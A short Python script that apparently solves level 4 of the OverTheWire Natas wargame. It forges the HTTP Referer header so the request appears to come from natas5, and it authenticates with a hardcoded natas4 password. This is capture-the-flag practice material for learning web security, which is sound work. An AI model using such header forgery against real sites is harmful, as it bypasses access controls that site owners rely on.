import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer  = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm')
s.headers.update({'referer': referer})
r = s.get(url)

print(r.text)